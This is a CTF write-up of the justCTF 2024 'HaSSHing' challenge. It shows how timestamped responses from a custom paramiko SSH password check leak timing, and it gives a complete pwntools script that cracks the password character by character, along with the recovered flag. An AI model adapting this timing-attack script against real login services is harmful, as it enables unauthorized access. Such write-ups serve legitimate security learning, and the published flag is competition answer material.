Author: 0x6fe1be2

Version 19-06-24

# [justCTF 2024 teaser](https://ctftime.org/event/2342) (15.06-16.06)

## HaSSHing
Category: MISC, PWN

Points: 174 (64 Solves)

Teammates: Popax21

> Interact with the keyboard or not, I don’t care; as only the flag will let you in - no chance of hash collisions here!
> The flag consists only of the following characters: "CFT_cdhjlnstuw{}" and digits. Each character may appear multiple times.
> Challenged provided by Trail of Bits and authored by elopez.
> ```bash
> ssh hasshing.nc.jctf.pro -l ctf -p 1337
> ```


### TL;DR

The ssh connection gives very precise times for the output log, that can be used as a side channel to crack the password byte for byte.

### Overview
No Files :,\

Using verbose mode we can get some interesting information

```
ssh hasshing.nc.jctf.pro -l ctf -p 1337 -vvv
```

notably

```
debug1: compat_banner: no match: paramiko_2.9.3                                                                                                                                                                                        
...
debug1: Authentications that can continue: keyboard-interactive,password
debug3: start over, passed a different list keyboard-interactive,password
debug3: preferred publickey,keyboard-interactive,password
debug3: authmethod_lookup keyboard-interactive
debug3: remaining preferred: password
debug3: authmethod_is_enabled keyboard-interactive
debug1: Next authentication method: keyboard-interactive
debug2: userauth_kbdint
```

`paramiko` might sound familiar to some, basically it's a big python ssh module that is used in project like `pwntools`. Also note that 2.9.3 is very outdated which might be interesting.

The used authentication method is `keyboard-interactive`.

Let's look at the source code for the interactive authentication code:

[server.py](https://github.com/paramiko/paramiko/blob/51eb55debf2ebfe56f38378005439a029a48225f/paramiko/server.py#L182)
```python
    def check_auth_interactive(self, username, submethods):
        """
        Begin an interactive authentication challenge, if supported.  You
        should override this method in server mode if you want to support the
        ``"keyboard-interactive"`` auth type, which requires you to send a
        series of questions for the client to answer.

        Return ``AUTH_FAILED`` if this auth method isn't supported.  Otherwise,
        you should return an `.InteractiveQuery` object containing the prompts
        and instructions for the user.  The response will be sent via a call
        to `check_auth_interactive_response`.

        The default implementation always returns ``AUTH_FAILED``.

        :param str username: the username of the authenticating client
        :param str submethods:
            a comma-separated list of methods preferred by the client (usually
            empty)
        :return:
            ``AUTH_FAILED`` if this auth method isn't supported; otherwise an
            object containing queries for the user
        :rtype: int or `.InteractiveQuery`
        """
        return AUTH_FAILED
```


Interesting, here isn't an implementation for this, meaning that the challenge creators must have created their own. Let's play around with it:

### Vulnerability

```
[keyboard-interactive authentication mode]
Server time is 2024-06-19 08:20:25.102303
(ctf@hasshing.nc.jctf.pro) password: a
[2024-06-19 08:20:25.845872] Checking password...
[2024-06-19 08:20:25.896760] That wasn't it, sorry. Try again.
(ctf@hasshing.nc.jctf.pro) password: j
[2024-06-19 08:20:28.040791] Checking password...
[2024-06-19 08:20:28.141839] That wasn't it, sorry. Try again.
(ctf@hasshing.nc.jctf.pro) password: 
```

We can see that the charactor `a` takes about 0.05s but `j` takes 0.1, which we know is the prefix of the flag, so let's use this information to write an exploit.


### Exploit


Thanks to Popax21 for writing the exploit and getting the flag during the CTF. I slightly modified it for the writeup.

Flag: `justCTF{s1d3ch4nn3ls_4tw_79828}`

<details>

```python
from pwn import *
import datetime
import re as regex

linfo = lambda x: log.info(x)
lwarn = lambda x: log.warn(x)
lerror = lambda x: log.error(x)
lprog = lambda x: log.progress(x)

byt = lambda x: x if isinstance(x, bytes) else x.encode() if isinstance(x, str) else repr(x).encode()
phex = lambda x, y='': print(y + hex(x))
lhex = lambda x, y='': linfo(y + hex(x))
pad = lambda x, s=8, v=b'\0', o='r': byt(x).ljust(s, byt(v)) if o == 'r' else byt(x).rjust(s, byt(v))
padhex = lambda x, s=None: pad(hex(x)[2:],((x.bit_length()//8)+1)*2 if s is None else s, b'0', 'l')
upad = lambda x: u64(pad(x))
tob = lambda x: bytes.fromhex(padhex(x).decode())

gelf = lambda elf=None: elf if elf else exe
srh = lambda x, elf=None: gelf(elf).search(byt(x)).__next__()
sasm = lambda x, elf=None: gelf(elf).search(asm(x), executable=True).__next__()
lsrh = lambda x: srh(x, libc)
lasm = lambda x: sasm(x, libc)

cyc = lambda x: cyclic(x)
cfd = lambda x: cyclic_find(x)
cto = lambda x: cyc(cfd(x))

t = None
gt = lambda at=None: at if at else t
sl = lambda x, t=None: gt(t).sendline(byt(x))
se = lambda x, t=None: gt(t).send(byt(x))
sla = lambda x, y, t=None: gt(t).sendlineafter(byt(x), byt(y))
sa = lambda x, y, t=None: gt(t).sendafter(byt(x), byt(y))
ra = lambda t=None: gt(t).recvall()
rl = lambda t=None: gt(t).recvline()
rls = lambda t=None: rl(t)[:-1]
re = lambda x, t=None: gt(t).recv(x)
ru = lambda x, t=None: gt(t).recvuntil(byt(x))
it = lambda t=None: gt(t).interactive()
cl = lambda t=None: gt(t).close()


THRESHOLD = 25000
CHARS = "_cdhjlnstuw" + string.digits + "{}CFT"

def extract_time(l):
    m = regex.match(rb"\[(.*)\]", l)
    assert m
    return datetime.datetime.fromisoformat(m.group(1).decode())

# justCTF{s1d3ch4nn3ls_4tw_79828}
pw = ""
prog = lprog("Cracking password")
info = lprog("Cracking info")
retries = 0

while True:
  context.log_level = 'error'
  t = process("ssh hasshing.nc.jctf.pro -l ctf -p 1337".split(), raw=True, stdin=process.PTY)
  context.log_level = 'info'
  try:
    while True:
      mc, mt = None, None
      for c in CHARS:

        prog.status(f"trying '%s%c'", pw, c)

        sla("(ctf@hasshing.nc.jctf.pro) password:", pw + c)

        rl()
        l = rl()

        if b"Checking password..." not in l and c == '}':
          prog.success(pw + c)
          cl()
          exit(0)

        start_time = extract_time(l)

        err_time = extract_time(rl())

        dt = err_time - start_time

        if mt is None or mt < dt:
          ot = mt
          mc = c
          mt = dt

        ddt = mt - min(dt, ot or dt)
        info.status(f"best(%c): %d, crnt: %d, delta: %d", 
                    mc, mt.microseconds, dt.microseconds, ddt.microseconds)

        if ddt.microseconds > THRESHOLD:
          break 

      if ddt.microseconds < THRESHOLD:
        if retries > 0:
          info.failure('failed twice sth is wrong')
          exit(1)
        info.status("retrying, very low delta '%s': %d", pw, ddt.microseconds)
        retries += 1
        continue

      pw += mc
      retries = 0

  except Exception:
    info.status('EOF restarting connection')
    context.log_level = 'error'
    cl()
```

</details>
